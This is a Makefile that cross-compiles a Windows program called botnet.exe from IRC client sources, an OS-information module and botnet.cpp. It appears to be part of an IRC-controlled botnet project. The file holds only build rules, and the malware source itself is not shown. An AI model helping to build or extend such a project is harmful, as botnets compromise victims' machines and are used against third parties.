CC=x86_64-w64-mingw32-g++
CFLAGS=-Wall -static
LIBS=-lws2_32
FILES=IRC/Socket.cpp IRC/IRCClient.cpp IRC/IRCManager.cpp OSInfo.cpp botnet.cpp

all: botnet

botnet:
	cd src; $(CC) $(CFLAGS) $(FILES) -o ../botnet.exe $(LIBS)
